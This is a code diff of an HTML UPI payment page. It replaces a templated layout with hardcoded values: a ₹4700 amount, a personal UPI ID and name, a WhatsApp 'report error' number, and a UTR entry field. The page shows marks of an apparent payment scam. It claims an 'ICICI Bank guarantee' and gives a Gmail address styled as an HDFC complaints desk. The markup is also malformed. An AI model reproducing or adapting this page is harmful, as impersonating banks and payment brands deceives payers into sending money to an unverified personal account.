@@ -1,164 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Payment</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vant@2.12/lib/index.css">
-  <link rel="stylesheet" href="style.css">
+ <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover">
+<title>repayment</title>
+<link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <div id="app">
-    <section id="nav">
-      <div style="padding: 6px;">
-        <div style="text-align: left;">
-          <div class="van-row van-row--justify-space-between" type="flex" style="text-align: end; padding: 0.2rem;">
-            <div class="van-col van-col--6">
-              <span style="float: left; margin-top: 0.8rem;">Amount</span>
-            </div>
-            <div class="van-col van-col--13">
-              <p>
-                <span style="font-weight: bold; text-align: right; margin-top: 0.8rem;"> ₹ {{ amount }}</span>
-              </p>
-            </div>
-            <div class="van-col van-col--5">
-              <button type="button" class="van-button van-button--primary van-button--normal van-button--plain" @click="copy(amount)">
-                <div class="van-button__content">
-                  <span class="van-button__text">COPY</span>
-                </div>
-              </button>
-            </div>
-          </div>
-          <div>
-            <div class="van-row van-row--justify-space-between" type="flex" style="text-align: end; padding: 0.2rem;">
-              <div class="van-col van-col--6">
-                <span style="float: left; margin-top: 0.8rem; text-align: left;">VPA/UPI</span>
-              </div>
-              <div class="van-col van-col--13">
-                <p>
-                  <span style="font-weight: bold; text-align: right; margin-top: 0.8rem;">{{ vpa }}</span>
-                </p>
-              </div>
-              <div class="van-col van-col--5">
-                <button type="button" class="van-button van-button--primary van-button--normal van-button--plain" @click="copy(vpa)">
-                  <div class="van-button__content">
-                    <span class="van-button__text">COPY</span>
-                  </div>
-                </button>
-              </div>
-            </div>
-            <div class="van-row van-row--justify-space-between" type="flex" style="text-align: end; padding: 0.2rem;">
-              <div class="van-col van-col--6">
-                <span style="float: left; margin-top: 0.8rem;">Name</span>
-              </div>
-              <div class="van-col van-col--13">
-                <p>
-                  <span style="font-weight: bold; text-align: right; margin-top: 0.8rem;">{{ name }}</span>
-                </p>
-              </div>
-            </div>
-          </div>
-          <div class="van-row van-row--justify-left" type="flex" style="margin-top: 0.2rem; padding: 0rem;">
-            <span class="title">
-              <i class="van-badge__wrapper van-icon van-icon-down"></i>
-              Select payment method and pay
-            </span>
-          </div>
-          <div role="separator" class="van-divider van-divider--hairline"></div>
-          <div class="van-radio-group" role="radiogroup">
-            <div class="van-row van-row--justify-left" style="margin-top: 1rem;">
-              <div role="radio" class="van-radio" tabindex="0" aria-checked="false">
-                <div class="van-radio__icon van-radio__icon--round">
-                  <i class="van-badge__wrapper van-icon van-icon-success"></i>
-                </div>
-              </div>
-              <div class="van-image" style="width: 150px; height: 20px; margin-left: 2rem;">
-                <img src="img/phone-pe.ccce0b08.png" class="van-image__img" style="object-fit: contain;">
-              </div>
-            </div>
-            <div role="separator" class="van-divider van-divider--hairline"></div>
-            <div class="van-row van-row--justify-left" style="margin-top: 1rem;">
-              <div role="radio" class="van-radio" tabindex="0" aria-checked="false">
-                <div class="van-radio__icon van-radio__icon--round">
-                  <i class="van-badge__wrapper van-icon van-icon-success"></i>
-                </div>
-              </div>
-              <div class="van-image" style="width: 150px; height: 20px; margin-left: 1.8rem;">
-                <img src="https://via.placeholder.com/150x20?text=Google+Pay" class="van-image__img" style="object-fit: contain;">
-              </div>
-            </div>
-            <div role="separator" class="van-divider van-divider--hairline"></div>
-            <div class="van-row van-row--justify-left" style="margin-top: 1rem;">
-              <div role="radio" class="van-radio" tabindex="0" aria-checked="false">
-                <div class="van-radio__icon van-radio__icon--round">
-                  <i class="van-badge__wrapper van-icon van-icon-success"></i>
-                </div>
-              </div>
-              <div class="van-image" style="width: 150px; height: 20px; margin-left: 1rem;">
-                <img src="https://via.placeholder.com/150x20?text=UPI" class="van-image__img" style="object-fit: contain;">
-              </div>
-            </div>
-            <div role="separator" class="van-divider van-divider--hairline"></div>
-          </div>
-          <div class="van-row van-row--justify-left" type="flex" style="margin-top: 0.2rem; padding: 0rem;">
-            <span class="title">
-              <i class="van-badge__wrapper van-icon van-icon-down"></i>
-              Fill the UTR numbers after you done payment
-            </span>
-          </div>
-          <form class="van-form">
-            <div class="van-cell van-field">
-              <div class="van-cell__title van-field__label" style="width: 50px;">
-                <label id="van-field-1-label" for="van-field-1-input">UTR</label>
-              </div>
-              <div class="van-cell__value van-field__value">
-                <div class="van-field__body">
-                  <input type="tel" inputmode="numeric" id="van-field-1-input" name="utr" class="van-field__control" placeholder="Input UTR number" aria-labelledby="van-field-1-label" v-model="utr">
-                </div>
-              </div>
-            </div>
-            <div style="margin: 8px;">
-              <button type="button" class="van-button van-button--primary van-button--normal van-button--block van-button--round" @click="submitUTR">
-                <div class="van-button__content">
-                  <span class="van-button__text"> Submit UTR </span>
-                </div>
-              </button>
-              <button type="button" class="van-button van-button--warning van-button--normal van-button--block van-button--round" style="margin-top: 8px;" @click="payFailed">
-                <div class="van-button__content">
-                  <span class="van-button__text"> Pay failed(Try bank account) </span>
-                  </div>
-                </button>
-            </div>
-          </form>
-          <van-popup v-model="showPopup" position="top">
-            <div style="padding: 20px;">
-              <h2>Payment Successful!</h2>
-              <p>Thank you for your payment.</p>
-              <van-button type="primary" @click="closePopup">Close</van-button>
-            </div>
-          </van-popup>
-          <div class="van-row van-row--justify-center" style="margin-top: 42px;">
-            <div class="van-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
-              <img src="img/logo_phonepe.e8a543ac.png" class="van-image__img">
-            </div>
-            <div class="van-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
-              <img src="img/logo_googlepay.35eb6799.png" class="van-image__img">
-            </div>
-            <div class="van-image" style="width: 30px; height: 30px; overflow: hidden; border-radius: 8px;">
-              <img src="data:imagepng;base64,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
+<div class="content">
+<div class="info">
+<p> <span>Amount:</span> <align="right"> <strong>₹4700</strong> <button onclick="copyText('4700')">COPY</button>   <p> <span>VPA/UPI:</span> <align="right"> <strong>sd9012621-2@okicici</strong> <button onclick="copyText('sd9012621-2@okicici')">COPY</button> <p><span1>Name:</span1> <align="right"> <strong>SUMAN SARKAR</strong> </p> </div>
+      <label class="section-title">↓ Select payment method and pay </label> 
+      <div class="payment-options"> <hr>
+        <label><input type="radio" name="payment-method" value="phonepe"> <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="79px" height="25px" style="vertical-align:middle"> </label> <hr>
+            <tr>
+        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="76px" height="25px" style="vertical-align:middle"> </label> <hr>
+              <tr>
+        <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="63px" height="30px" style="vertical-align:middle"> </label> <hr>
+              <tr>
+        <label><input type="radio" name="payment-method" value="upi"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" width="64px" height="25px" style="vertical-align:middle"> </label> <hr> </hr>
+        </div>
+
+      <label class="utr-instruction">↓ Fill the UTR numbers after you done payment</label> 
+<div class="inline-elements">
+<span>UTR</span> <align="right"> <input type="text" id="utr" placeholder="Input UTR number"> </div>
+<a class="error-repot" href="https://api.whatsapp.com/send?phone=918119990974"style="color:red;">Pay failed? (Report error) </a> <hr>
+      <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
+     </div>
+      </div>
+     <center><div class="inline-elementss"style="margin-top:10px;justify-content:center;"> <img src="https://i.ibb.co.com/Bsy5F40/IMG-5519.jpg" alt="IMG-5519" style="width: 24px; height: 25px; border-radius: 5px;"> <img src="https://i.ibb.co.com/rFxbvZ2/IMG-5518.png" alt="IMG-5518" style="width: 24px; height: 25px; border-radius: 5px;"> <img src="https://i.ibb.co.com/jTnN0LN/IMG-5516.png" alt="IMG-5516" style="width: 34px; height: 22px; border-radius: 5px;"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" style="width: 34px; height: 22px; border-radius: 0px;"></div></center>
+          </div> 
+       <div class="van-row"> 
+       <div body="Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:"style="align:center; justify-content:center; font-weight:600; font-size: 0.7rem; margin-top:1rem; color:lightgray;">Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:<a href="mailto:hdfcbankcomplaintacceptance@gmail.com" style="color: royalblue;">hdfcbankcomplaintacceptance@gmail.com</a>
 </div>
-            <div class="van-image" style="width: 60px; height: 30px; overflow: hidden; border-radius: 8px;">
-              <img src="img/logo_upi.fdc50d2a.png" class="van-image__img">
-              </div>
-          </div>
-          <div class="van-row van-row--align-center van-row--justify-center" style="font-weight: lighter; font-size: 0.7rem; margin-top: 1.2rem; color: rgb(136, 134, 134);"> Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact: <a href="mailto:hdfcbankcomplaintacceptance@gmail.com" style="color: royalblue;">hdfcbankcomplaintacceptance@gmail.com</a>
-          </div>
+            <br> </br>
         </div>
-        </div>
-    </section>
-  </div>
-  <script src="https://cdn.jsdelivr.net/npm/vue@2.6/dist/vue.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/vant@2.12/lib/vant.min.js"></script>
-  <script src="script.js"></script>
+      </div>
+  <!-- Notification Popup -->
+  <div id="notification" class="notification"></div>
+<script src="script.js"> </script>
 </body>
+<script>
+    /(pad|pod|iPad|iPod|iOS)/i.test(navigator.userAgent) && (head = document.getElementsByTagName('head'), viewport = document.createElement('meta'), viewport.name = 'viewport', viewport.content = 'target-densitydpi=device-dpi, width=480px, user-scalable=no', head.length > 0 && head[head.length - 1].appendChild(viewport));
+  </script>
+</header>
+</Container>
 </html>
